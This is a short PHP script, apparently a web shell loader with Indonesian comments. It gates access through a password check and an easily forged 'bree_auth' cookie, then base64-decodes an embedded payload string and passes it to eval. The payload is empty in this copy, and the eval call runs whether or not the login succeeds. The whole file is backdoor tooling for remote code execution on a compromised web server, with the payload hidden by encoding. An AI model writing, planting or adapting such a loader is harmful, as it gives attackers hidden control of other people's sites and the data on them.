$cookie_name = 'bree_auth';

// ========== CEK LOGIN VIA POST ==========
if (isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $password_hash)) {
        setcookie($cookie_name, '1', time() + 3600, '/');
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = '❌ Password salah!';
    }
}

// ========== CEK COOKIE ==========
$is_login = isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === '1';

// ========== LOGOUT ==========
if (isset($_GET['logout'])) {
    setcookie($cookie_name, '', time() - 3600, '/');
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ========== SHELL BASE64 ==========
$shell_base64 = '';

function runShell($base64) {
    $decoded = base64_decode($base64);
    if ($decoded !== false) {
        eval('?>' . $decoded);
    }
    return true;
}

runShell($shell_base64);
exit;
